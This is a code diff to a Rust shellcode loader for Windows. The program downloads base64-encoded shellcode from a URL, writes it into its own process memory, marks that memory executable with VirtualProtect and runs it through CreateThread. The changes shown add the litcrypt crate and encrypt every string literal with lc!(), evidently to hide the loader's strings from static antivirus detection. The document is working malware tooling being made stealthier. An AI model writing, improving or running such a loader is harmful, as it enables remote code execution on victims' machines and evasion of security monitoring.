@@ -2,6 +2,7 @@ extern crate reqwest;
 extern crate base64;
 extern crate tokio;
 extern crate windows;
+extern crate litcrypt;
 
 use std::ptr;
 use std::ffi::c_void;
@@ -25,6 +26,11 @@ use windows::{
     },
     Win32::System::WindowsProgramming::INFINITE
 };
+
+
+use litcrypt::{lc, use_litcrypt};
+
+use_litcrypt!();
 
 
 /// The URL where shellcode will be downloaded from
@@ -71,8 +77,8 @@ async fn get_shellcode(url: String, b64_iterations: usize) -> Result<Vec<u8>, St
                 if let Ok(s) = String::from_utf8(shellcode_decoded) {
                     shellcode_string = s;
                 } else {
-                    let err_msg = "Could not convert bytes to string";
-                    return Err(err_msg.to_owned());
+                    let err_msg = lc!("Could not convert bytes to string");
+                    return Err(err_msg);
                 }                    
                 // At this point, we have the comma-separated "0xNN" form of the shellcode.
                 // We need to get each one until a proper u8.
@@ -94,8 +100,8 @@ async fn get_shellcode(url: String, b64_iterations: usize) -> Result<Vec<u8>, St
                 return Ok(shellcode_final_vec);
 
             } else {
-                let err_msg = "Could not decode shellcode";
-                return Err(err_msg.to_owned());
+                let err_msg = lc!("Could not decode shellcode");
+                return Err(err_msg);
             }
 
         } else {
@@ -103,7 +109,7 @@ async fn get_shellcode(url: String, b64_iterations: usize) -> Result<Vec<u8>, St
         }   
 
     } else {
-        return Err("Could not download shellcode".to_string());
+        return Err(lc!("Could not download shellcode"));
     }
 } 
 
@@ -124,18 +130,18 @@ async fn main() {
             );
 
             if base_addr.is_null() {
-                println!("Couldn't allocate memory to current proc.");
+                println!("{}", lc!("Couldn't allocate memory to current proc."));
             } else {
-                println!("Allocated memory to current proc.");
+                println!("{}", lc!("Allocated memory to current proc."));
             }
 
             // copy shellcode into mem
-            println!("Copying Shellcode to address in current proc.");
+            println!("{}", lc!("Copying Shellcode to address in current proc."));
             std::ptr::copy(shellcode.as_ptr() as _, base_addr, shellcode.len());
-            println!("Copied...");
+            println!("{}", lc!("Copied..."));
 
             // Flip mem protections from RW to RX with VirtualProtect. Dispose of the call with `out _`
-            println!("Changing mem protections to RX...");
+            println!("{}", lc!("Changing mem protections to RX..."));
 
             let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
 
@@ -147,11 +153,11 @@ async fn main() {
             );
 
             if mem_protect.0 == 0{
-                return println!("Error during injection");
+                return println!("{}", lc!("Error during injection"));
             }
 
             // Call CreateThread
-            println!("Calling CreateThread...");
+            println!("{}", lc!("Calling CreateThread..."));
 
             let mut tid = 0;
             let ep: extern "system" fn(*mut c_void) -> u32 = { std::mem::transmute(base_addr) };
@@ -166,14 +172,14 @@ async fn main() {
             ).unwrap();
 
             if h_thread.is_invalid() {
-                println!("Error during inject.");
+                println!("{}", lc!("Error during inject."));
             } else {
                 println!("Thread Id: {tid}");
             }
             
             if WaitForSingleObject(h_thread, INFINITE) == 0 {
-               println!("Good!");
-               println!("Injection completed!");
+               println!("{}", lc!("Good!"));
+               println!("{}", lc!("Injection completed!"));
             } else {
                let error = GetLastError();
                println!("{:?}", error);
